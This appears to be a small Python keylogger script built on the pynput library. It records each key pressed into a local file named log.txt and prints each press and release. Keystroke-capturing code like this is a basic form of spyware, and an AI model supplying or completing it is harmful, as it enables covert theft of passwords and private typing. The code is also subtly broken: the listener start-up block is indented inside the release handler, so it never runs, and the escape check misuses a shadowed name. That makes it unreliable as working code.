import pynput
from pynput.keyboard import Key, Listener

Keys = []

def on_press(Key):
    Keys.append(Key)
    write_file(Keys)

    try:
        print('alphanumric key {0} pressed' .format(Key.char))
    except AttributeError:
        print('special key {0} pressed' .format(Key))
              
def write_file(Keys):
    with open('log.txt', 'w') as f:
        for key in Keys:
          
          
            # removing ''

            k = str(key).replace("'", "")
            f.write(k)

            #every keystroke for readablity..

            f.write(' ')

def on_release(Key):
    print('{0} released' .format(Key))
    if Key == Key.esc:

        # stop listener
       
        return False
    
    with Listener(on_press = on_press, on_release = on_release) as Listener:
        Listener.join()